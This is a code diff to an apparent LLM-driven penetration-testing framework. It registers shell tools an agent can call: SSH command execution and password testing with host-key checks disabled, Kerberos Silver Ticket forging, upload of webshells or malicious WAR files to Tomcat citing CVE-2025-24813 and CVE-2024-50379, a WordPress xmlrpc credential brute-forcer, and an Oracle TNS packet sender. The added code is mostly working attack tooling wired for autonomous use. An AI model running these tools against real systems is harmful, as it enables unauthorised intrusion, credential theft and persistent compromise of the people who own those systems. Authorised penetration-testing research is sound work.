@@ -587,12 +587,13 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
     gateway.register_shell_tool(
         name="ssh_key_exec",
-        command_template="ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -i {key_path} {user}@{host} '{command}' 2>&1",
-        description="Execute a command on a remote host using SSH key authentication (no password needed)",
+        command_template="ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -o PasswordAuthentication=no -o BatchMode=yes -p {port} -i {key_path} {user}@{host} '{command}' 2>&1",
+        description="Execute a command on a remote host using SSH key authentication (no password needed). Always specify port — default SSH port is 22, but many targets use non-standard ports.",
         parameters={
             "key_path": {"type": "string", "description": "Path to SSH private key file"},
             "user": {"type": "string", "description": "SSH username"},
             "host": {"type": "string", "description": "Target host IP or hostname"},
+            "port": {"type": "integer", "description": "SSH port (e.g. 10222)", "default": 22},
             "command": {"type": "string", "description": "Command to execute on the remote host"},
         },
         parser=_parse_shell_output,
@@ -600,12 +601,14 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="test_credential",
-        command_template="sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 {user}@{host} 'id' 2>&1",
-        description="Test if a username/password combination works on a remote host via SSH. Returns user info if successful.",
+        command_template="sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p {port} {user}@{host} '{command}' 2>&1",
+        description="Test if a username/password combination works on a remote host via SSH. Returns user info if successful. Always specify port — non-standard ports are common.",
         parameters={
             "user": {"type": "string", "description": "Username to test"},
             "password": {"type": "string", "description": "Password to test"},
             "host": {"type": "string", "description": "Target host IP or hostname"},
+            "port": {"type": "integer", "description": "SSH port (e.g. 10222)", "default": 22},
+            "command": {"type": "string", "description": "Command to execute if login succeeds (default: id)", "default": "id"},
         },
         parser=_parse_shell_output,
         timeout=30,
@@ -648,19 +651,27 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
     # ── Knowledge search (DarwinRAG + keyword fallback) ──────────
     async def knowledge_search(query: str, category: str = "") -> ToolResult:
-        """Search penetration testing knowledge base for exploit patterns using
-        TF-IDF semantic search with keyword-based fallback."""
+        """Search penetration testing knowledge base for exploit patterns.
+
+        Category filter is IGNORED for the primary search — it causes false
+        negatives when knowledge entries use different category tags than the
+        LLM expects. The LLM-provided category is only used if the initial
+        unfiltered search returns >10 results, as a precision refinement pass.
+        """
         try:
             from darwin.rag import get_rag
             rag = get_rag()
-            results = rag.search(query, top_k=5, category=category)
+            # Always search WITHOUT category filter first
+            results = rag.search(query, top_k=5, category="")
+            # Only apply category filter if first pass is too noisy
+            if len(results) > 10 and category:
+                results = rag.search(query, top_k=5, category=category)
 
-            # Fallback: keyword-based search via KnowledgeBase
             if not results:
                 try:
                     from darwin.knowledge_base import KnowledgeBase
                     kb = KnowledgeBase()
-                    kb_entries = kb.search(query, category=category or "", top_k=5)
+                    kb_entries = kb.search(query, category="", top_k=5)
                     if kb_entries:
                         output = "## Knowledge Base (keyword match)\n\n"
                         for i, e in enumerate(kb_entries, 1):
@@ -1030,6 +1041,135 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             "domain_sid": {"type": "string", "description": "Domain SID (e.g. S-1-5-21-...)"},
             "domain": {"type": "string", "description": "Fully qualified domain name"},
             "user": {"type": "string", "description": "Username to impersonate (default: Administrator)"},
+        },
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+
+    # ── Silver Ticket ──────────────────────────────────────────────
+
+    gateway.register_shell_tool(
+        name="impacket_silver_ticket",
+        command_template="impacket-ticketer -nthash {service_hash} -domain-sid {domain_sid} -domain {domain} -spn {service_spn} {user} 2>&1 | head -50",
+        description="Silver Ticket: forge a Kerberos TGS (service ticket) using the target service account's NTLM hash. Grants access to a specific service (e.g. 'cifs/dc.domain.com', 'http/web.domain.com') without domain admin privileges. Requires the service account's NTLM hash and domain SID.",
+        parameters={
+            "service_hash": {"type": "string", "description": "Target service account NTLM hash (32 hex chars)"},
+            "domain_sid": {"type": "string", "description": "Domain SID (e.g. S-1-5-21-...)"},
+            "domain": {"type": "string", "description": "Fully qualified domain name"},
+            "service_spn": {"type": "string", "description": "Service SPN (e.g. 'cifs/dc.domain.com', 'http/web.domain.com', 'HOST/dc.domain.com')"},
+            "user": {"type": "string", "description": "Username to impersonate (default: Administrator)"},
+        },
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+
+    # ── Tomcat Exploitation ────────────────────────────────────────
+
+    gateway.register_shell_tool(
+        name="tomcat_exploit",
+        command_template=(
+            "python3 -c \""
+            "import requests, base64\n"
+            "b64 = '{payload_b64}'.encode()\n"
+            "data = base64.b64decode(b64)\n"
+            "files = {{'file': ('{filename}', data)}}\n"
+            "try:\n"
+            "    r = requests.{http_method}('{target_url}', files=files, timeout=30, verify=False)\n"
+            "    print(f'Status: {{r.status_code}}')\n"
+            "    print(r.text[:2000])\n"
+            "except Exception as e:\n"
+            "    print(f'Error: {{e}}')\n"
+            "\" 2>&1",
+        ),
+        description="Tomcat exploitation: upload a malicious file (WAR/JSP) to Tomcat manager or upload endpoint. Use for CVE-2025-24813 (deserialization upload) or deploying webshells. Provide payload as base64-encoded content. Combine with send_payload for advanced payload construction.",
+        parameters={
+            "target_url": {"type": "string", "description": "Tomcat upload URL (e.g. 'http://host:8080/manager/html/upload')"},
+            "payload_b64": {"type": "string", "description": "Base64-encoded payload content (WAR file or JSP shell)"},
+            "filename": {"type": "string", "description": "Filename for upload (e.g. 'shell.war', 'exploit.jsp')"},
+            "http_method": {"type": "string", "description": "HTTP method: PUT for CVE-2024-50379 race condition, POST for standard uploads"},
+        },
+        parser=_parse_shell_output,
+        timeout=60,
+    )
+
+    # ── WordPress Exploitation ──────────────────────────────────────
+
+    gateway.register_shell_tool(
+        name="wpscan_enum",
+        command_template="wpscan --url {target_url} --enumerate {enum_mode} --api-token {api_token} 2>&1 | head -200",
+        description="WordPress vulnerability scanner using wpscan. Enumerate plugins, themes, users, and vulnerable components. Use when whatweb_scan identifies a WordPress installation. Requires wpscan to be installed on the host.",
+        parameters={
+            "target_url": {"type": "string", "description": "WordPress base URL (e.g. 'http://target/wordpress')"},
+            "enum_mode": {"type": "string", "description": "Enumeration mode: 'vp' (vulnerable plugins), 'vt' (vulnerable themes), 'u' (users), 'ap' (all plugins), 'at' (all themes), or combined 'p,t,u'"},
+            "api_token": {"type": "string", "description": "WPScan API token (use empty string if not available)"},
+        },
+        parser=_parse_shell_output,
+        timeout=120,
+    )
+
+    gateway.register_shell_tool(
+        name="wp_xmlrpc_brute",
+        command_template=(
+            "python3 -c \"\n"
+            "import requests, sys\n"
+            "url = '{target_url}/xmlrpc.php'\n"
+            "users = ['{users}']\n"
+            "passwords = ['{passwords}']\n"
+            "for u in users:\n"
+            "    for p in passwords:\n"
+            "        xml = '''<?xml version=\\\\\\\"1.0\\\\\\\"?><methodCall><methodName>wp.getUsers</methodName>"
+            "<params><param><value><string>'''+u+'''</string></value></param>"
+            "<param><value><string>'''+p+'''</string></value></param></params></methodCall>'''\n"
+            "        try:\n"
+            "            r = requests.post(url, data=xml, timeout=10)\n"
+            "            if r.status_code == 200 and 'faultCode' not in r.text:\n"
+            "                print(f'SUCCESS: {{u}}:{{p}}')\n"
+            "                print(r.text[:500])\n"
+            "        except: pass\n"
+            "\" 2>&1 | head -50",
+        ),
+        description="Brute-force WordPress credentials via xmlrpc.php using wp.getUsers method. Use when you have identified a WordPress site and need to test weak credentials. Provide comma-separated username and password lists.",
+        parameters={
+            "target_url": {"type": "string", "description": "WordPress base URL (e.g. 'http://target/wordpress')"},
+            "users": {"type": "string", "description": "Comma-separated usernames (e.g. 'admin,editor')"},
+            "passwords": {"type": "string", "description": "Comma-separated passwords (e.g. 'password,admin,123456')"},
+        },
+        parser=_parse_shell_output,
+        timeout=60,
+    )
+
+    # ── Oracle TNS Poisoning ───────────────────────────────────────
+
+    gateway.register_shell_tool(
+        name="oracle_tns_poison",
+        command_template=(
+            "python3 -c \"\n"
+            "import socket, struct\n"
+            "host = '{target_host}'\n"
+            "port = {tns_port}\n"
+            "sid = '{sid}'\n"
+            "desc = f'(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST={{host}})(PORT=port))(CONNECT_DATA=(SID={{sid}})))'\n"
+            "payload = desc.encode()\n"
+            "pkt_len = len(payload)\n"
+            "header = struct.pack('>HH', pkt_len, 6) + b'\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00'\n"
+            "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+            "sock.settimeout(10)\n"
+            "try:\n"
+            "    sock.connect((host, port))\n"
+            "    sock.send(header + payload)\n"
+            "    resp = sock.recv(4096)\n"
+            "    print(f'Sent TNS CONNECT packet to {{host}}:{{port}} for SID={{sid}}')\n"
+            "    print(f'Response ({{len(resp)}} bytes): {{resp[:500]}}')\n"
+            "    sock.close()\n"
+            "except Exception as e:\n"
+            "    print(f'TNS error: {{e}}')\n"
+            "\" 2>&1 | head -50",
+        ),
+        description="Oracle TNS Poisoning: send a crafted TNS CONNECT packet to an Oracle listener. Used for SID enumeration and TNS protocol attacks (DB-03 Oracle TNS scenario). Use when Oracle listener is detected on port 1521.",
+        parameters={
+            "target_host": {"type": "string", "description": "Target Oracle DB host IP"},
+            "tns_port": {"type": "integer", "description": "TNS listener port (default 1521)"},
+            "sid": {"type": "string", "description": "Oracle SID to test (e.g. 'ORCL', 'XE', 'ORACLE')"},
         },
         parser=_parse_shell_output,
         timeout=30,
